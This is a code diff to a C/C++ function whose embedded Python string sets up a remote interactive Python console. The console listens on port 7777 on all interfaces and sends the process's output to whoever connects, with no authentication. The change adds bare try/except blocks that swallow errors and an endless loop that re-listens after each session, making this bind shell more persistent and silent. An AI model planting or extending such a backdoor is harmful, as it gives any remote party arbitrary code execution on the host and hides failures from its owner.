@@ -304,31 +304,52 @@ bool EchoIncomingPackets(SOCKET sd)
 
 		"class MyConsole(code.InteractiveConsole):\n"
 			"\tdef __init__(self, rfile, wfile, locals=None):\n"
-				"\t\tself.rfile = rfile\n"
-				"\t\tself.wfile = wfile\n"
-				"\t\tcode.InteractiveConsole.__init__(self, locals=locals, filename='<MyConsole>')\n"
+				"\t\ttry:\n"
+				"\t\t\tself.rfile = rfile\n"
+				"\t\t\tself.wfile = wfile\n"
+				"\t\t\tcode.InteractiveConsole.__init__(self, locals=locals, filename='<MyConsole>')\n"
+				"\t\texcept:\n"
+				"\t\t\tpass\n"
 
 			"\tdef raw_input(self, prompt=''):\n"
-				"\t\tself.wfile.write(prompt)\n"
-				"\t\treturn self.rfile.readline().rstrip()\n"
+				"\t\ttry:\n"
+					"\t\t\tself.wfile.write(prompt)\n"
+					"\t\t\treturn self.rfile.readline().rstrip()\n"
+				"\t\texcept:\n"
+					"\t\t\tpass\n"
 
 			"\tdef write(self, data):\n"
-				"\t\tself.wfile.write(data)\n"
+				"\t\ttry:\n"
+					"\t\t\tself.wfile.write(data)\n"
+				"\t\texcept:\n"
+					"\t\t\tpass\n"
 
-		"netloc = ('', 7777)\n"
-		"servsock = socket.socket()\n"
-		"servsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)\n"
-		"servsock.bind(netloc)\n"
-		"servsock.listen(5)\n"
-		"print 'listening'\n"
-		"sock, _ = servsock.accept()\n"
-		"print 'accepted'\n"
 
-		"rfile = sock.makefile('r', 0)\n"
-		"sys.stdout = wfile = sock.makefile('w', 0)\n"
 
-		"console = MyConsole(rfile, wfile)\n"
-		"console.interact()\n");
+		"def handleSocket():\n"
+		"\ttry:\n"
+			"\t\tnetloc = ('', 7777)\n"
+			"\t\tservsock = socket.socket()\n"
+			"\t\tservsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)\n"
+			"\t\tservsock.bind(netloc)\n"
+			"\t\tservsock.listen(5)\n"
+			"\t\tsock, _ = servsock.accept()\n"
+
+			"\t\trfile = sock.makefile('r', 0)\n"
+			"\t\tsys.stdout = wfile = sock.makefile('w', 0)\n"
+
+			"\t\tconsole = MyConsole(rfile, wfile)\n"
+			"\t\tconsole.interact()\n"
+		
+		"\texcept:\n"
+			"\t\tservsock.close()\n"
+			"\t\tsys.stdout.close()\n"
+
+		"while True:\n"
+		"\thandleSocket()\n"
+		);
+	
+
 		//"utrhead(console.interact())\n");
 		
 
